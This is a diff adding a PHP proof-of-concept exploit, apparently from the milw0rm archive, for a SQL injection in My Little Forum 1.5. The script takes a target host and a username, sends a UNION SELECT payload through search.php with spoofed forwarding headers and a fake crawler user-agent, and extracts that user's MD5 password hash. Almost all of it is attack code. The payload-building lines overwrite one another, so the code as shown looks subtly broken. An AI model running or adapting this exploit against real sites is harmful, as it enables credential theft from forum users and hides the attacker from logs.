@@ -1,0 +1,162 @@
+<?php
+#   mlfexpl.php                                                                #
+#                                                                              #
+#   My Little Forum 1.5 ( possibly prior versions) SQL Injection /             #
+#   MD5 password hash disclosure poc exploit with proxy support                #
+#                                                                              #
+#                                by rgod                                       #
+#                      site: http://rgod.altervista.org                        #
+#                                                                              #
+#   make these changes in php.ini if you have troubles                         #
+#   to launch this script:                                                     #
+#   allow_call_time_pass_reference = on                                        #
+#   register_globals = on                                                      #
+#                                                                              #
+#   usage: launch this script from Apache, fill requested fields, then...      #
+#   dump all password hashes from database right now...                        #
+#                                                                              #
+#   Sun-Tzu: "You can be sure of succeeding in your attacks if you only attack #
+#   places which are undefended. You can ensure the safety of your defense if  #
+#   you only hold positions that cannot be attacked."                          #
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout", 2);
+ob_implicit_flush (1);
+
+echo'<head><title>My Little Forum 1.5 SQL Injection </title><meta http-equiv="Co
+ntent-Type"  content="text/html; charset=iso-8859-1"><style type="text/css"><!--
+body,td,th {   color:  #00FF00;} body {  background-color: #000000;} .Stile5   {
+font-family: Verdana, Arial, Helvetica,  sans-serif; font-size: 10px;}  .Stile6{
+font-family: Verdana, Arial, Helvetica, sans-serif; font-weight:  bold; font-sty
+le: italic; } --> </style></head> <body> <p class="Stile6">  My   Little Forum 1
+.5 SQL Injection </p><p class="Stile6">a script by rgod at <a href="http: //rgod
+.altervista.org"    target="_blank" > http://rgod.altervista.org </a> </p><table
+width="84%"><tr><td width="43%">  <form  name="form1"  method="post"   action="'
+.$SERVER[PHP_SELF].'?path=value&host=value&port=value&proxy=value&username=value
+"><p><input type="text" name="host"><span class="Stile5">hostname (ex: www.siten
+ame.com) </span></p><p><input type="text"    name="path">  <span class="Stile5">
+path (ex: /mylf/ or just /) </span></p><p><input type="text"  name="port" ><span
+class="Stile5"> specify a port other than 80 (default value)</span></p><p><input
+type="text" name="proxy"> <span class="Stile5"> send  exploit  through  an  HTTP
+proxy (ip:port) </span> </p> <p> <input type="text" name="username"> <span class
+="Stile5">username whom you want MD5 hash </span> </p> <p> <input  type="submit"
+name="Submit" value="go!"></p></form></td></tr></table></body>';
+
+function show($headeri)
+{
+$ii=0;
+$ji=0;
+$ki=0;
+$ci=0;
+echo '<table border="0"><tr>';
+while ($ii <= strlen($headeri)-1)
+{
+$datai=dechex(ord($headeri[$ii]));
+if ($ji==16) {
+             $ji=0;
+             $ci++;
+             echo "<td>&nbsp;&nbsp;</td>";
+             for ($li=0; $li<=15; $li++)
+                      { echo "<td>".$headeri[$li+$ki]."</td>";
+			    }
+            $ki=$ki+16;
+            echo "</tr><tr>";
+            }
+if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
+{echo "<td>".$datai."</td> ";}
+$ii++;
+$ji++;
+}
+for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
+                      { echo "<td>&nbsp&nbsp</td>";
+                       }
+
+for ($li=$ci*16; $li<=strlen($headeri); $li++)
+                      { echo "<td>".$headeri[$li]."</td>";
+			    }
+echo "</tr></table>";
+}
+
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpacket($packet,$show)
+{
+global $proxy, $host, $port, $html;
+if ($proxy=='')
+           {$ock=fsockopen(gethostbyname($host),$port);}
+             else
+           {
+	    if (!eregi($proxy_regex,$proxy))
+	    {echo htmlentities($proxy).' -> not a valid proxy...';
+	     die;
+	    }
+	   $parts=explode(':',$proxy);
+	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
+	    $ock=fsockopen($parts[0],$parts[1]);
+	    if (!$ock) { echo 'No response from proxy...';
+			die;
+		       }
+	   }
+fputs($ock,$packet);
+if ($proxy=='')
+  {
+
+    $html='';
+    while (!feof($ock))
+      {
+        $html.=fgets($ock);
+      }
+  }
+else
+  {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
+    {
+      $html.=fread($ock,1);
+    }
+  }
+fclose($ock);
+if ($show) {echo nl2br(htmlentities($html));}
+}
+
+if (($path<>'') and ($host<>'') and ($username<>''))
+{
+  if ($port=='') {$port=80;}
+
+
+$sql="%' UNION SELECT user_pw, user_pw, user_pw, user_pw, user_pw, user_pw, user_pw, user_pw, user_pw, user_pw, user_pw";
+$sql=", user_pw"; //if version is 1.6 beta, just add a comment to ths line
+$sql=" FROM forum_userdata WHERE user_name='".$username."'/*";
+$sql=urlencode($sql);
+
+if ($proxy=='')
+{$packet="GET ".$path."search.php?search=".$sql."&ao=phrase HTTP/1.1\r\n";}
+else
+{$packet="GET http://".$host.$path."search.php?search=".$sql."&ao=phrase HTTP/1.1\r\n";}
+$packet.="Client-IP: 127.0.0.1\r\n";
+$packet.="X-Forwarded-For: 127.0.0.1\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
+$packet.="Referer: http://".$host.$path."search.php\r\n";
+$packet.="Accept-Language: en\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Baiduspider+(+http://www.baidu.com/search/spider.htm)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Keep-Alive\r\n\r\n";
+show($packet);
+sendpacket($packet,0);
+$temp=explode(';<span class="category">(',$html);
+$temp2=explode(')</span>',$temp[1]);
+$hash=$temp2[0];
+
+echo '<br>username: '.$username.' hash: '.$hash;
+# debugging...
+//echo htmlentities($html);
+}
+else
+{
+echo '<br>fill in all requested fields, optionally specify a proxy...<br>';
+}
+?>
+
+# milw0rm.com [2005-09-22]
